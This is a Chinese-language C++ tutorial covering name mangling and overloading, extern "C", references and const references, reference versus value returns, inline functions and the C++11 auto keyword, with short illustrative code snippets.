<p><strong>C语言不支持函数重载，因为编译的时候，两个重载函数，函数名相同，在fun.o符号表中存在歧义和冲突，其次链接的时候也存在歧义和冲突，因为他们都是直接使用函数名去标识和查找的，而重载函数，函数名相同。</strong></p> 
<p><img src="https://images2.imgbox.com/4a/84/OsgONUrU_o.png" alt="在这里插入图片描述"></p> 
<p>C++支持函数重载是因为C++的目标文件符号表中不是直接用函数名来标识和查找函数</p> 
<p><strong>1.C++有函数名修饰规则，但是这个修饰规则不同的编译器下面是不同的。Linux下g++的函数名修饰规则：_Z+函数名长度+函数名+参数名首字母</strong></p> 
<p><strong>2.有了函数名修饰规则，只要参数不同，func.o符号表里面重载的函数就不存在二义性和冲突了</strong></p> 
<p><strong>3.链接的时候，test.o的main函数里面去调用那两个重载的函数找地址时，也是明确的。</strong></p> 
<p><img src="https://images2.imgbox.com/ec/4c/4fFQUgA8_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>总结：<strong>C语言不能支持函数重载，是因为他们都是直接使用函数名去标识和查找的，而同名函数没法区分。C++是支持函数重载，是因为C++是通过函数名修饰规则来区分的，只要函数的形参不同，修饰出来的名字就会不一样，因此也就支持了重载。</strong></p> 
 <p><strong>如果在当前文件有函数的定义，那么在编译时就填上地址了。如果在当前文件中只有函数的声明，那么定义就在其他xxx.cpp文件中，编译时没有地址，只能链接到时候去xxx.o符号表中根据函数修饰名字去查找，这就是链接的重要工作。</strong></p> 
</blockquote> 
<h5>
<a id="externC_414"></a>extern"C“的作用是什么？</h5> 
<p>有时候在C++工程中可能需要将某些函数按照C的风格来编译，<strong>在函数前加extern“C",意思是告诉编译器，将该函数按照C语言规则来编译。注意:在函数前加extern”C"后，该函数便不能支持函数重载了。</strong></p> 
<h4>
<a id="_418"></a><strong>引用</strong>
</h4> 
<h5>
<a id="_420"></a>引用概念</h5> 
<blockquote> 
 <p>引用不是新定义一个变量，而是给已存在变量取了一个别名，编译器不会为引用变量开辟内存空间，它和它引用的变量是共用同一块内存空间。</p> 
 <p>比如：水浒传中的李逵，在家称为”铁牛“，江湖上人称”黑旋风“。又或者你在家的时候你爸妈会叫你的小名，但是在外面的时候别人会叫你全名但是他们叫的都是同一个人啊。</p> 
 <p><strong>类型&amp;引用变量名（对象名）= 引用实体</strong></p> 
 <pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span>
using namespace std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
	<span class="token comment">//引用定义</span>
	<span class="token keyword">int</span><span class="token operator">&amp;</span>b <span class="token operator">=</span> a<span class="token punctuation">;</span>

	<span class="token comment">//取地址</span>
	<span class="token keyword">int</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token operator">&amp;</span>b<span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%pn"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%pn"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
 <p><img src="https://images2.imgbox.com/c6/81/1s3geVMt_o.png" alt="在这里插入图片描述"></p> 
</blockquote> 
<h5>
<a id="_450"></a>引用特性</h5> 
<blockquote> 
 <p><strong>1.引用在定义时必须初始化</strong></p> 
 <p><strong>2.一个变量可以有多个引用</strong></p> 
 <p><strong>3.引用一旦引用一个实体，再不能引用其他实体</strong></p> 
 <pre><code class="prism language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">//1.引在再定义时必须初始化</span>
	<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span><span class="token operator">&amp;</span>b <span class="token operator">=</span> a<span class="token punctuation">;</span>

	<span class="token comment">//2.一个变量可以又多个引用</span>
	<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span><span class="token operator">&amp;</span>b <span class="token operator">=</span> a<span class="token punctuation">;</span>
	<span class="token keyword">int</span><span class="token operator">&amp;</span>c <span class="token operator">=</span> a<span class="token punctuation">;</span>
	<span class="token keyword">int</span><span class="token operator">&amp;</span>d <span class="token operator">=</span> a<span class="token punctuation">;</span>


	<span class="token comment">//3.引用一旦引用一个实体，再不能引用其它实体</span>
	<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span><span class="token operator">&amp;</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>
	<span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span>
	<span class="token comment">//1.这里是让b变成c的别名呢？ 否</span>
	<span class="token comment">//2.这里是把c赋值给b?  是</span>
	b <span class="token operator">=</span> c<span class="token punctuation">;</span>

	<span class="token comment">//指针的话可以随时改变指向</span>
	<span class="token keyword">int</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">;</span>
	p1 <span class="token operator">=</span> <span class="token operator">&amp;</span>c<span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
 <p>总结：指针——渣男，引用——对感情专一。</p> 
</blockquote> 
<h5>
<a id="_490"></a>常引用</h5> 
<pre><code class="prism language-c"><span class="token operator">/</span> 常引用
<span class="token comment">//权限可以缩小或者不变，但是不能放大</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	 <span class="token comment">//权限放大  不可以</span>
	<span class="token keyword">const</span> <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> 
    <span class="token keyword">int</span><span class="token operator">&amp;</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>

	<span class="token comment">// 权限不变 可以</span>
	<span class="token keyword">const</span> <span class="token keyword">int</span> ra <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
	<span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> rb <span class="token operator">=</span> ra<span class="token punctuation">;</span>

	<span class="token comment">// 权限的缩小 可以</span>
	<span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
	<span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> d <span class="token operator">=</span> c<span class="token punctuation">;</span>


	<span class="token keyword">double</span> d <span class="token operator">=</span> <span class="token number">11.11</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> b <span class="token operator">=</span> d<span class="token punctuation">;</span><span class="token comment">//隐式类型转换</span>
	<span class="token keyword">int</span><span class="token operator">&amp;</span> b <span class="token operator">=</span> d<span class="token punctuation">;</span>
	<span class="token comment">//不可以,因为发生隐式类型转换的时候，d会先将自己的值赋给一个临时变量，然后b就是临时变量的引用</span>
	<span class="token comment">//临时变量具有常性，只能读不能写，而将b作为临时变量的引用这样属于是权限的放大，是不可以的</span>
	<span class="token comment">//但是如果在前面加上const修饰就可以了，这样就属于权限不变</span>
	<span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> b <span class="token operator">=</span> d<span class="token punctuation">;</span><span class="token comment">//ok</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>总结：<strong>权限可以缩小或者不变，但是不能放大。const Type &amp;可以接收各种类型的对象，简称const通吃！</strong></p> 
<h5>
<a id="_524"></a>使用场景</h5> 
<p>1.做参数</p> 
<blockquote> 
 <p>记得我们在C语言写过一个Swap的交换函数，当时用它来说明传值与传址的区别。现在我们学了引用之后，就可以不用指针做形参而是用引用来做形参了。</p> 
 <pre><code class="prism language-C">void Swap(int* p1, int* p2)//传地址
{
	int temp = *p1;
	*p1 = *p2;
	*p2 = temp;
}

void Swap(int r1, int r2)//传值
{
	int temp = r1;
	r1 = r2;
	r2 = temp;
}

void Swap(int&amp; r1, int&amp; r2)//传引用
{
	int temp = r1;
	r1 = r2;
	r2 = temp;
}
</code></pre> 
 <p>为什么可以这样呢？因为r1与r2是实参的引用（别名），我们将r1与r2的值进行交换，就相当于是对实参进行交换。</p> 
</blockquote> 
<p>2.做返回值</p> 
<blockquote> 
 <p>同样的引用也可以用来做返回值，<strong>但是需要特别注意的是，我们返回的数据不能是函数内部创建的局部变量，因为在函数内部定义的局部变量会随着函数调用结束就会被销毁。我们返回的数据必须是被static修饰或是动态开辟的或者说是全局变量等不会随着函数调用结束而被销毁的数据。</strong></p> 
 <p>下面我们来说一下传值返回与传引用返回的区别吧</p> 
 <p>1.传值返回</p> 
 <pre><code class="prism language-c"><span class="token comment">//所有的传值返回都会生成一个拷贝</span>
<span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>
	<span class="token keyword">return</span> c<span class="token punctuation">;</span>
	<span class="token comment">//这里返回的并不是c，而是通过一个临时变量将c的值拷贝之后返回给ret</span>
	<span class="token comment">//如果c比较小(4or8),一般是由寄存器充当临时变量</span>
	<span class="token comment">//如果c比较大，临时变量就会存放在调用Add函数的栈帧中</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> y <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token function">Add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span>ret<span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
 <p>2.传引用返回</p> 
 <pre><code class="prism language-c"><span class="token comment">//没有像传值返回那样生成一个拷贝</span>
<span class="token keyword">int</span><span class="token operator">&amp;</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>
	<span class="token keyword">return</span> c<span class="token punctuation">;</span>
	<span class="token comment">//返回的是c的引用(别名)</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> y <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token function">Add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span>ret<span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
 <p>当前代码存在的一些问题：</p> 
 <p><strong>1.存在非法访问，因为Add(1,2)的返回值是c的引用，所以Add函数栈帧销毁之后，会去访问c位置空间</strong></p> 
 <p><strong>2.如果Add函数栈帧销毁，清理空间，那么取c值的时候取到的就是随机值，给ret就是随机值。当前这个取决于编译器的实现了。</strong></p> 
</blockquote> 
<p>注意：<strong>如果函数返回时，出了作用域，如果返回对象还未返回给操作系统，则可以使用传引用返回，如果已经还给了操作系统，则必须使用传值返回。</strong></p> 
<h5>
<a id="_612"></a>值和引用的作为返回值类型的性能比较</h5> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h&gt;</span></span>
<span class="token keyword">struct</span> <span class="token class-name">A</span><span class="token punctuation">{<!-- --></span> <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

A a<span class="token punctuation">;</span>
<span class="token comment">// 值返回 -- 每次拷贝40000byte</span>
A <span class="token function">TestFunc1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token keyword">return</span> a<span class="token punctuation">;</span> <span class="token punctuation">}</span>

<span class="token comment">// 引用返回 -- 没有拷贝</span>
A<span class="token operator">&amp;</span> <span class="token function">TestFunc2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span> <span class="token keyword">return</span> a<span class="token punctuation">;</span> <span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">TestReturnByRefOrValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">// 以值作为函数的返回值类型</span>
	<span class="token class-name">size_t</span> begin1 <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
		<span class="token function">TestFunc1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">size_t</span> end1 <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// 以引用作为函数的返回值类型</span>
	<span class="token class-name">size_t</span> begin2 <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
		<span class="token function">TestFunc2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">size_t</span> end2 <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// 计算两个函数运算完成之后的时间</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"TestFunc1 time:"</span> <span class="token operator">&lt;&lt;</span> end1 <span class="token operator">-</span> begin1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"TestFunc2 time:"</span> <span class="token operator">&lt;&lt;</span> end2 <span class="token operator">-</span> begin2 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token function">TestReturnByRefOrValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/ed/6e/Hq4hGfcz_o.png" alt="在这里插入图片描述"></p> 
<p><strong>我们可以发现传值和引用引用作为返回值类型上效率相差很大</strong></p> 
<h5>
<a id="_657"></a>引用和指针的区别</h5> 
<p>在语法概念上引用就是一个别名，没有独立空间，和其引用实体共用同一块空间</p> 
<pre><code class="prism language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span><span class="token operator">&amp;</span>b <span class="token operator">=</span> a<span class="token punctuation">;</span>
	<span class="token comment">//b是a的别名 与a共用同一块空间，没有新开辟空间</span>

	<span class="token keyword">int</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">;</span>
	<span class="token comment">//这里定义了一个p的指针，并开辟了4字节(32位平台下)的空间,用于存储a的地址</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>但是在底层实现上实际是有空间的，因为引用是按照指针方式来实现的</p> 
<pre><code class="prism language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>

	<span class="token keyword">int</span><span class="token operator">&amp;</span>ra <span class="token operator">=</span> a<span class="token punctuation">;</span>
	ra <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>

	<span class="token keyword">int</span><span class="token operator">*</span> pa <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">;</span>
	<span class="token operator">*</span>pa <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>我们来看一下引用和指针的汇编代码</p> 
<p><img src="https://images2.imgbox.com/aa/a6/QvCB7cM9_o.png" alt="在这里插入图片描述"></p> 
<p><strong>引用与指针的区别(很重要！！！面试经常考察，最好是彻底理解它)：</strong></p> 
<p>1.引用概念上定义一个变量的别名（没开空间），指针存储一个变量地址。</p> 
<p>2.引用在定义时必须初始化，指针最好初始化，但是不初始化也不会报错。</p> 
<p>3.引用在初始化时引用一个实体后，就不能再引用其他实体，而指针可以在任何时候指向一个同类型的实体。</p> 
<p>4.没有NULL引用，但是又NULL指针。</p> 
<p>5.在sizeof中含义不同，引用结果为引用类型的大小，但指针始终是地址空间所占字节个数（32位平台下占4个字节）</p> 
<p>6.引用自加即引用的实体增加1，指针字加即指针向后偏移一个类型的大小。</p> 
<p>7.有多级指针，但是没有多级引用。</p> 
<p>8.访问实体方式不同，指针需要显示解引用，引用编译器自己处理。</p> 
<p>9.引用比指针使用起来相对更安全。</p> 
<h4>
<a id="_715"></a>内联函数</h4> 
<h5>
<a id="_717"></a>内联函数的概念</h5> 
<p>在C语言中为了小函数避免建立栈帧，通常会使用宏函数，预处理阶段展开。而在C++中以inline修饰的函数叫做内联函数，编译时C++编译器会在调用内联函数的地方展开，没有函数压栈的开销，内联函数提升程序运行的效率。</p> 
<blockquote> 
 <p>我们可以通过观察调用普通函数和内联函数的汇编代码来观察其优势：</p> 
 <pre><code class="prism language-c"><span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	ret <span class="token operator">=</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
 <p><img src="https://images2.imgbox.com/10/5b/IpCLlsJh_o.png" alt="在这里插入图片描述"></p> 
 <p><img src="https://images2.imgbox.com/fc/00/wjSBQG31_o.png" alt="在这里插入图片描述"><br> 我们可以通过汇编代码看到内联函数调用时，并没有调用函数这个过程的汇编指令。</p> 
</blockquote> 
<h5>
<a id="_742"></a>内联函数的特性</h5> 
<p>1.inline是一种以空间换实际的做法，省区调用函数的额外开销。所以代码很长或者有循环递归的函数不适宜使用作为内联函数。</p> 
<p>2.inline对于编译器而言知识一个建议，编译器会自动优化，如果定义为inline内有循环/递归等等，编译器优化时会忽略掉内联。</p> 
<p>3.inline不建议声明和定义分离，分离会导致链接错误。因为inline被展开，就没有函数地址了，链接就会找不到。</p> 
<pre><code class="prism language-c"><span class="token comment">//F.h</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span>
using namespace std<span class="token punctuation">;</span>

<span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token comment">//F.cpp</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"F.h"</span></span>
<span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token comment">//main.cpp</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"F.h"</span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token function">f</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// 链接错误：main.obj : error LNK2019: 无法解析的外部符号 "void __cdecl f(int)" (?f@@YAXH@Z)，该符号在函数 _main 中被引用</span>
</code></pre> 
<p>总结：频繁调用的小函数，建议定义成inline</p> 
<h5>
<a id="_778"></a>面试题</h5> 
<p><strong>既然C语言已经解决了，为什么C++还要提供inline函数呢？（宏函数的缺点）面试题考点</strong></p> 
<p>a.宏函数不支持调试</p> 
<p>b.宏函数语法复杂，容易出错</p> 
<p>c没有类型安全的检查</p> 
<p><strong>C++有哪些技术替代宏？</strong></p> 
<p>1.常量定义换用const</p> 
<p>2.函数定义换用内联函数</p> 
<h4>
<a id="autoC11_794"></a>auto关键字（C++11）</h4> 
<h5>
<a id="auto_796"></a>auto简介</h5> 
<blockquote> 
 <p>在早期C/C++中auto的含义是：使用auto修饰的变量，是具有自动存储器的局部变量，但遗憾的是一直没有人去使用它。</p> 
 <p>在C++11中，标准委员会赋予了auto全新的含义即：auto不再是一个存储类型指示符，而是作为一个新的类型指示符来指示编译器，auto声明的变量必须由编译器在编译时期推导而得。</p> 
 <pre><code class="prism language-C">#include&lt;iostream&gt;
using namespace std;

double Test()
{
	return 3.14;
}
int main()
{
	int a = 10;
	auto b = a;//类型声明成auto，可以根据a的类型自动推到b的类型
	auto c = 'a';
	auto d = Test();

	//打印变量b，c，d的类型
	cout &lt;&lt; typeid(b).name() &lt;&lt; endl;//int 
	cout &lt;&lt; typeid(c).name() &lt;&lt; endl;//char
	cout &lt;&lt; typeid(d).name() &lt;&lt; endl;//double

	return 0;
}
</code></pre> 
 <p><img src="https://images2.imgbox.com/17/0f/RwyJ3cHy_o.png" alt="在这里插入图片描述"></p> 
 <p>注意：</p> 
 <p>使用auto定义变量时必须对其进行初始化，在编译阶段编译器需要根据初始化表达式来推导auto的实际类型，因此auto并非是一种“类型”的声明，而是一个类型声明时的“占位符”，编译器在编译期会将auto替换为变量实际的类型。</p> 
</blockquote> 
<h5>
<a id="auto_832"></a>auto的使用细则</h5> 
<p><strong>1.auto与指针和引用结合起来使用</strong></p> 
<p>用auto声明指针类型时，用auto和auto*没有任何区别，但是auto声明引用类型时必须加&amp;</p> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span>
using namespace std<span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>

	<span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
	<span class="token keyword">auto</span> a <span class="token operator">=</span> <span class="token operator">&amp;</span>x<span class="token punctuation">;</span><span class="token comment">//int*</span>
	<span class="token keyword">auto</span><span class="token operator">*</span> b <span class="token operator">=</span> <span class="token operator">&amp;</span>x<span class="token punctuation">;</span><span class="token comment">//int*</span>
	<span class="token keyword">int</span><span class="token operator">&amp;</span> y <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token comment">//y的类型是什么?int</span>
	<span class="token keyword">auto</span> c <span class="token operator">=</span> y<span class="token punctuation">;</span><span class="token comment">//int</span>
	<span class="token keyword">auto</span><span class="token operator">&amp;</span>d <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token comment">//d的类型是int,但是这里指定了d是x的引用</span>

	<span class="token comment">//打印变量的类型</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token function">typeid</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token function">typeid</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token function">typeid</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token function">typeid</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token function">typeid</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token function">typeid</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/98/7b/JR1KiUsG_o.png" alt="在这里插入图片描述"></p> 
<p>注意：<strong>用auto声明指针类型时，用auto和auto*没有任何区别，但是用auto声明引用类型时必须加&amp;，否贼创建的是与实体类型相同的普通变量。</strong></p> 
<p>2.在同一行定义多个变量</p> 
<blockquote> 
 <p>当在同一行声明多个变量时，这些变量必须是相同的类型，否则编译器将会报错，因为编译器实际只对第一个类型进行推导，然后用推导出来的类型去定义其他变量。</p> 
 <pre><code class="prism language-C">int main()
{
	auto a = 1, b = 3;//正确
	auto c = 4, d = 5.0//该代码会编译失败，因为c和d的初始表达式类型不同
}
</code></pre> 
</blockquote> 
<h5>
<a id="auto_881"></a>auto不能推导的场景</h5> 
<p>1.auto不能作为函数的参数</p> 
<pre><code class="prism language-c"><span class="token comment">//此处代码会编译失败，auto不能作为形参类型，因为编译器无法对a的实际类型进行推导</span>
<span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">auto</span> a<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"hello"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>2.auto不能直接用来声明数组</p> 
<pre><code class="prism language-C">void Test()
{

	int a[] = { 1, 2, 3 };
	auto b[] = { 4, 5, 6 };
}
</code></pre> 
